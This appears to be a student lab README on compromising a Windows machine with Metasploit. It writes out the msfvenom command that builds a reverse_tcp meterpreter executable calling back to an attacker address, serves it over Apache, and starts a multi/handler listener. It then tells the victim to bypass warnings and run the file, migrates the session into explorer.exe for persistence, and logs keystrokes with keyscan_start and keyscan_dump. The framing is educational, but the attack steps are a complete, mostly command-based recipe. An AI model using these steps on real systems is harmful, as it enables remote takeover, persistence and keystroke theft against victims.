<img width="479" height="66" alt="548621850-28807bd2-546a-4886-bf66-2ec88b6b030c" src="https://github.com/user-attachments/assets/18672b97-44fa-44b0-81b7-dfc2a3a2d245" /><img width="618" height="370" alt="548616406-577cc3a3-ba98-4d4c-8d3a-0a504115bbdb" src="https://github.com/user-attachments/assets/30fab1b3-2a5f-498b-b59b-a5827c1c86af" /># Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="765" height="274" alt="image" src="https://github.com/user-attachments/assets/3a36e86d-bb7f-4f53-b098-63e8b04a5cac" />

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="604" height="144" alt="image" src="https://github.com/user-attachments/assets/d8c41d84-5dce-48de-a26a-1bb5b8cfde5c" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="438" height="66" alt="image" src="https://github.com/user-attachments/assets/7f5ae3e4-7e97-4a15-b9ff-b637d84c1770" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="378" height="52" alt="image" src="https://github.com/user-attachments/assets/5248d685-34a3-4b75-af41-916994ea6f17" />

Check the status of apache2
## OUTPUT:

<img width="764" height="297" alt="image" src="https://github.com/user-attachments/assets/41717b2a-54fc-4ef1-a718-08039d5ca80e" />

Invoke msfconsole:
## OUTPUT:

<img width="716" height="760" alt="image" src="https://github.com/user-attachments/assets/c1e49aef-a35f-426d-b370-5277460da53a" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="760" height="768" alt="image" src="https://github.com/user-attachments/assets/c5bf62cc-b963-40b9-b71f-17756060984c" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="627" height="167" alt="image" src="https://github.com/user-attachments/assets/e1cfdc89-c6d3-4a88-a1cd-f41ec3eca80f" />

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1536" height="960" alt="Screenshot 2026-08-24 231839" src="https://github.com/user-attachments/assets/82702277-3294-4f80-9118-4ad61070b770" />

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1536" height="960" alt="Screenshot 2026-08-24 231939" src="https://github.com/user-attachments/assets/cf87a5ea-e655-4c93-9a43-ec30372286af" />

On kali/parrot give the command exploit
## OUTPUT:

<img width="387" height="36" alt="image" src="https://github.com/user-attachments/assets/85224e60-9e62-42e1-9a17-01f779b52592" />

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="385" height="120" alt="image" src="https://github.com/user-attachments/assets/2d6f6966-bab8-4f00-942f-1e570683bdd5" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="618" height="370" alt="548616406-577cc3a3-ba98-4d4c-8d3a-0a504115bbdb" src="https://github.com/user-attachments/assets/4eebabe8-0666-4535-b898-4fdb1f2fe08f" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="479" height="66" alt="548621850-28807bd2-546a-4886-bf66-2ec88b6b030c" src="https://github.com/user-attachments/assets/794a70c6-9387-4f87-a825-38ceac989e9e" />

keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="595" height="236" alt="548622003-a381ab78-4a7f-4efc-b88c-dd6a4d026e69" src="https://github.com/user-attachments/assets/76675370-4531-48e5-a9ea-85ff7e5b3a48" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
